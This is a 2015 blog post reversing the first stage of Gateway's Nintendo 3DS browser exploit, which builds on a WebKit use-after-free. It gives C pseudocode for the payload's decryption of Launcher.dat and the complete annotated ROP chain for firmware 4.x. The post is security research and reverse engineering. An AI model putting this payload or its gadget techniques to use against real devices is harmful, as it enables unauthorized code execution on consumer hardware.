---
author: yifanlu
comments: true
date: 2015-01-10
layout: post
slug: reversing-gateway-ultra-first-stage-part-1
title: Reversing Gateway Ultra First Stage (Part 1)
wordpress_id: 1002
categories:
- 3DS
- Assembly
- Information
tags:
- 3ds
- encryption
- gateway
- rop
- userland
- vulnerability
- webkit
---

And now for something completely different...

As a break from Vita hacking, I've decided to play around with the Nintendo 3DS exploit released by Gateway yesterday. The 3DS is a much easier console to hack, but unfortunately, the scene is dominated by a piracy company who, ironically, implement various "features" to protect their intellectual property (one such feature purposely bricks any user of a cloned piracy cart--and also "legitimate" users too). Ethics aside, it would be useful to reverse Gateway's exploits and use them for homebrew loading so I took a quick look at it. The first stage of the exploit is an entry-point into the system that allows code to run in the unprivileged user-mode. It is usually used to exploit a kernel vulnerability, which is the second stage. In the unique case of Gateway, the first stage is broken up into two parts (in order for them to obfuscate their payload). I am only going to look at the first part for now.<!-- more -->


#### Vulnerability


The userland vulnerability is a [known use-after-free bug in WebKit](https://code.google.com/p/chromium/issues/detail?id=226696) found in April last year (and no, the latest Vita firmware is not vulnerable). Depending on the user-agent of the 3DS visiting the exploit page, a different payload for that browser version is sent. A [GBATemp user](http://gbatemp.net/threads/attempt-running-gw3-0-web-exploit-on-a-local-network.378058/page-3#post-5268233) has dumped all the possible payloads, and I used the 4.x one in my analysis (although I believe the only difference in the different payloads are memory offsets).


#### Details


This is what the initial first stage payload does:

```c
void *_this = 0x08F10000;
int *read_len = 0x08F10020;
int *buffer = 0x08F01000;
int state = 0;
int i = 0;
FS_MOUNTSDMC("dmc:");
IFile_Open(_this, L"dmc:/Launcher.dat", 0x1);
*((int *)_this + 1) = 0x00012000; // fseek according to sm on #3dsdev
IFile_Read(_this, read_len, buffer, 0x4000);

for (i = 0; i &lt; 0x4000/4; i++)
{
    state += 0xD5828281;
    buffer[i] += state;
}
```

The important part here is that the rest of the payload is decrypted from "Launcher.dat" by creating a stream cipher from a (crappy) PRNG that just increments by 0xD5828281 every iteration. Instead of an xor-pad, it uses an "add"-pad. Otherwise it is pretty standard obfuscation. A neat trick in this ROP payload is the casting of ARM code as Thumb to get gadgets that were not originally compiled into code (I am unsure if they also tried casting RO data as Thumb code, as that is also a way of getting extra gadgets). Another neat trick is emulating loops by using ARM conditional stores to conditionally set the stack pointer to some value (although I was told they used this trick in the original Gateway payload too).


#### Future


The first part was very simple and straightforward and was easy to reverse. I am expecting that the second part would involve a lot more code so I may need to work on a tool to extract the gadgets from code. (By the way, thanks to **sbJFn5r** on #3dsdev for providing me with the WebKit code to look at and **sm** for the hint about fseek). It is likely that I won't have the time to continue this though (still working on the Vita) but it seems like many others are farther ahead than me anyways.


#### Payload


For those who care, the raw (annotated) payload for 4.X:

    
```
    0x08B47400: 0x0010FFFD ; (nop) POP {PC}
    0x08B47404: 0x0010FFFD ; (nop) POP {PC}
    0x08B47408: 0x0010FFFD ; (nop) POP {PC}
    0x08B4740C: 0x0010FFFD ; (nop) POP {PC}
    0x08B47410: 0x002AD574 ; LDMFD   SP!, {R0,PC}
    0x08B47414: 0x002A5F27 ; R0 = "dmc:"
    0x08B47418: 0x00332BEC ; FS_MOUNTSDMC(), then LDMFD   SP!, {R3-R5,PC}
    0x08B4741C: 0x08B475F0 ; R3, dummy
    0x08B47420: 0x00188008 ; R4, dummy
    0x08B47424: 0x001DA00C ; R5, dummy
    0x08B47428: 0x0017943B ; Thumb: POP     {R0-R4,R7,PC}
    0x08B4742C: 0x08F10000 ; R0 = this
    0x08B47430: 0x08B47630 ; R1 = L"dmc:/Launcher.dat"
    0x08B47434: 0x00000001 ; R2 = read/only
    0x08B47438: 0x0039B020 ; R3, dummy
    0x08B4743C: 0x001CC01C ; R4, dummy
    0x08B47440: 0x002C6010 ; R7, dummy
    0x08B47444: 0x0025B0A8 ; IFile_Open(), then LDMFD   SP!, {R4-R7,PC}
    0x08B47448: 0x00231FF0 ; R4, dummy
    0x08B4744C: 0x002CBFF0 ; R5, dummy
    0x08B47450: 0x00124000 ; R6, dummy
    0x08B47454: 0x0033FFFD ; R7, dummy
    0x08B47458: 0x0010FFFD ; (nop) POP {PC}
    0x08B4745C: 0x002AD574 ; LDMFD   SP!, {R0,PC}
    0x08B47460: 0x00012000 ; R0
    0x08B47464: 0x00269758 ; LDMFD   SP!, {R1,PC}
    0x08B47468: 0x08F10004 ; R1
    0x08B4746C: 0x00140450 ; *(int*)0x08F10004 = 0x00012000, then LDMFD   SP!, {R4,PC}
    0x08B47470: 0x001CC024 ; R4
    0x08B47474: 0x0017943B ; Thumb: POP     {R0-R4,R7,PC}
    0x08B47478: 0x08F10000 ; R0 = this
    0x08B4747C: 0x08F10020 ; R1 = p_total_read
    0x08B47480: 0x08F01000 ; R2 = read_buffer
    0x08B47484: 0x00004000 ; R3 = size
    0x08B47488: 0x00295FF8 ; R4, dummy
    0x08B4748C: 0x00253FFC ; R7, dummy
    0x08B47490: 0x002FC8E8 ; IFile_Read, then LDMFD   SP!, {R4-R9,PC}
    0x08B47494: 0x002BE030 ; R4, dummy
    0x08B47498: 0x00212010 ; R5, dummy
    0x08B4749C: 0x00271F40 ; R6, dummy
    0x08B474A0: 0x0020C05C ; R7, dummy
    0x08B474A4: 0x002DE0C4 ; R8, dummy
    ... START_DECODE_LOOP ...
    0x08B474A8: 0x001B2000 ; R9, dummy || LR, dummy (upon loop)
    0x08B474AC: 0x002AD574 ; LDMFD   SP!, {R0,PC}
    0x08B474B0: 0x08B4750C ; R0 (&state;)
    0x08B474B4: 0x001CCC64 ; R0 = *R0 = state, LDMFD   SP!, {R4,PC}
    0x08B474B8: 0x001057C4 ; R4, dummy
    0x08B474BC: 0x00269758 ; LDMFD   SP!, {R1,PC}
    0x08B474C0: 0xD5828281 ; R1 (seed)
    0x08B474C4: 0x00207954 ; R0 = R0 + R1, LDMFD   SP!, {R4,PC}
    0x08B474C8: 0x0011FFFD ; R4, dummy
    0x08B474CC: 0x00269758 ; LDMFD   SP!, {R1,PC}
    0x08B474D0: 0x08B4750C ; R1 (&state;)
    0x08B474D4: 0x00140450 ; *R1 = R0 = next random, LDMFD   SP!, {R4,PC}
    0x08B474D8: 0x00354850 ; R4, dummy
    0x08B474DC: 0x002AD574 ; LDMFD   SP!, {R0,PC}
    0x08B474E0: 0x08B47618 ; R0 (&buffer;)
    0x08B474E4: 0x001CCC64 ; R0 = *R0 = buffer, LDMFD   SP!, {R4,PC}
    0x08B474E8: 0x00127F6D ; R4, dummy
    0x08B474EC: 0x00100D24 ; LDMFD   SP!, {R4-R6,PC}
    0x08B474F0: 0x001037E0 ; R4, dummy
    0x08B474F4: 0x08B4748C ; R5, dummy
    0x08B474F8: 0x08B4740C ; R6, dummy
    0x08B474FC: 0x001CCC64 ; R0 = *R0 (read32 from buffer), LDMFD   SP!, {R4,PC}
    0x08B47500: 0x0011BB00 ; R4, dummy
    0x08B47504: 0x0010FFFD ; (nop) POP {PC}
    0x08B47508: 0x00269758 ; LDMFD   SP!, {R1,PC}
    0x08B4750C: 0x00000000 ; R1 (PRG state)
    0x08B47510: 0x00207954 ; R0 = R0 + R1 (add PRG state to buffer data), LDMFD   SP!, {R4,PC}
    0x08B47514: 0x001303A0 ; R4, dummy
    0x08B47518: 0x00103DA8 ; LDMFD   SP!, {R4-R12,PC}
    0x08B4751C: 0x00101434 ; R4, dummy
    0x08B47520: 0x0022FF64 ; R5, dummy
    0x08B47524: 0x001303A0 ; R6, dummy
    0x08B47528: 0x08B47400 ; R7, dummy
    0x08B4752C: 0x0010FFFD ; R8, dummy
    0x08B47530: 0x0010FFFD ; R9, dummy
    0x08B47534: 0x00100B5C ; R10, dummy
    0x08B47538: 0x0022FE44 ; R11, dummy
    0x08B4753C: 0x0010FFFD ; R12, (nop) POP {PC}
    0x08B47540: 0x0018114C ; LDMFD   SP!, {R4-R6,LR}, BX R12
    0x08B47544: 0x001057C4 ; R4, dummy
    0x08B47548: 0x00228AF4 ; R5, dummy
    0x08B4754C: 0x00350658 ; R6, dummy
    0x08B47550: 0x0010FFFD ; LR, (nop) POP {PC}
    0x08B47554: 0x00158DE7 ; R1 = R0 = (decoded data), BLX LR
    0x08B47558: 0x002AD574 ; LDMFD   SP!, {R0,PC}
    0x08B4755C: 0x08B47618 ; R0 (&buffer;)
    0x08B47560: 0x001CCC64 ; R0 = *R0 = buffer, LDMFD   SP!, {R4,PC}
    0x08B47564: 0x0011FFFD ; R4, dummy
    0x08B47568: 0x00119B94 ; *R0 = R1 = (decoded data), LDMFD   SP!, {R4,PC}
    0x08B4756C: 0x00106694 ; R4, dummy
    0x08B47570: 0x00269758 ; LDMFD   SP!, {R1,PC}
    0x08B47574: 0x00000004 ; R1
    0x08B47578: 0x00207954 ; R0 = R0 + R1 (buffer + 4), LDMFD   SP!, {R4,PC}
    0x08B4757C: 0x00130344 ; R4, dummy
    0x08B47580: 0x00269758 ; LDMFD   SP!, {R1,PC}
    0x08B47584: 0x08B47618 ; R1 (&buffer;)
    0x08B47588: 0x00140450 ; *R1 = R0 (set new buffer), LDMFD   SP!, {R4,PC}
    0x08B4758C: 0x00100D24 ; R4, dummy
    0x08B47590: 0x00269758 ; LDMFD   SP!, {R1,PC}
    0x08B47594: 0xF70FB000 ; R1
    0x08B47598: 0x00207954 ; R0 = R0 + R1 = 0xFFFFC004, LDMFD   SP!, {R4,PC}
    0x08B4759C: 0x00119864 ; R4, dummy
    0x08B475A0: 0x001B560C ; SET_FLAGS (R0 != 0), if (flags) R0 = 1, LDMFD   SP!, {R3,PC}
    0x08B475A4: 0x002059C0 ; R3, dummy
    0x08B475A8: 0x002AD574 ; LDMFD   SP!, {R0,PC}
    0x08B475AC: 0x08B47610 ; R0 (val for LR)
    0x08B475B0: 0x00269758 ; LDMFD   SP!, {R1,PC}
    0x08B475B4: 0x08F00FFC ; R1
    0x08B475B8: 0x00119B94 ; *R0 = R1 = 0x08F00FFC (next stage), LDMFD   SP!, {R4,PC}
    0x08B475BC: 0x00355FD4 ; R4, dummy
    0x08B475C0: 0x00269758 ; LDMFD   SP!, {R1,PC}
    0x08B475C4: 0x08B474A8 ; R1
    0x08B475C8: 0x0020E780 ; if (flags) *R0 = R1 = 0x08B474A8 (loop), LDMFD   SP!, {R4,PC}
    0x08B475CC: 0x002C2215 ; R4, dummy
    0x08B475D0: 0x0010FFFD ; (nop) POP {PC}
    0x08B475D4: 0x0010FFFD ; (nop) POP {PC}
    0x08B475D8: 0x00103DA8 ; LDMFD   SP!, {R4-R12,PC}
    0x08B475DC: 0x002D5654 ; R4, dummy
    0x08B475E0: 0x00103778 ; R5, dummy
    0x08B475E4: 0x002FA864 ; R6, dummy
    0x08B475E8: 0x00119B94 ; R7, dummy
    0x08B475EC: 0x0020E780 ; R8, dummy
    0x08B475F0: 0x00128605 ; R9, dummy
    0x08B475F4: 0x00103DA8 ; R10, dummy
    0x08B475F8: 0x08B475F8 ; R11, dummy
    0x08B475FC: 0x0010FFFD ; R12, dummy
    0x08B47600: 0x0018114C ; LDMFD   SP!, {R4-R6,LR}
    0x08B47604: 0x0010FFFD ; R4, dummy
    0x08B47608: 0x002FC8E4 ; R5, dummy
    0x08B4760C: 0x001037E0 ; R6, dummy
    0x08B47610: 0x0023C494 ; LR (later set to 0x08B474A8)
    0x08B47614: 0x002D6A30 ; SP = LR, LDMFD   SP!, {LR,PC}
    ... END OF ROP PAYLOAD ...
    0x08B47618: 0x08F01000 ; buffer
    0x08B4761C: 0x002D6A1C ; 
    0x08B47620: 0x08B47400 ; 
    0x08B47624: 0x0010FFFD ; 
    0x08B47628: 0x0010FFFD ; 
    0x08B4762C: 0x002D6A1C ; 
    0x08B47630: L"dmc:/Launcher.dat"
    0x08B47654: 0x00000000 ; 
    0x08B47658: 0x00000000 ; 
    0x08B4765C: 0x00000000 ; 
    0x08B47660: 0x00000000 ; 
    0x08B47664: 0x00000000 ; 
    0x08B47668: 0x00000000 ; 
    0x08B4766C: 0x002D6A1C ; 
    0x08B47670: 0x00000000 ; 
    0x08B47674: 0x00000000 ; 
    0x08B47678: 0x00000000 ; 
    0x08B4767C: 0x00000000 ; 
    0x08B47680: 0x00000000 ; 
    0x08B47684: 0x00000000 ; 
    0x08B47688: 0x00000000 ; 
    0x08B4768C: 0x00000000 ; 
    0x08B47690: 0x00000000 ; 
    0x08B47694: 0x00000000 ; 
    0x08B47698: 0x00000000 ; 
    0x08B4769C: 0x00000000 ; 
    0x08B476A0: 0x00000000 ; 
    0x08B476A4: 0x00000000 ; 
    0x08B476A8: 0x00000000 ; 
    0x08B476AC: 0x00000000 ; 
    0x08B476B0: 0x00000000 ; 
    0x08B476B4: 0x00000000 ; 
    0x08B476B8: 0x00000000 ; 
    0x08B476BC: 0x00000000 ; 
    0x08B476C0: 0x00000000 ; 
    0x08B476C4: 0x00000000 ; 
    0x08B476C8: 0x00000000 ; 
    0x08B476CC: 0x00000000 ; 
    0x08B476D0: 0x00000000 ; 
    0x08B476D4: 0x00000000 ; 
    0x08B476D8: 0x00000000 ; 
    0x08B476DC: 0x00000000 ; 
    0x08B476E0: 0x00000000 ; 
    0x08B476E4: 0x00000000 ; 
    0x08B476E8: 0x00000000 ; 
    0x08B476EC: 0x00000000 ; 
    0x08B476F0: 0x00000000 ; 
    0x08B476F4: 0x00000000 ; 
    0x08B476F8: 0x00000000 ; 
    0x08B476FC: 0x00000000 ; 
```
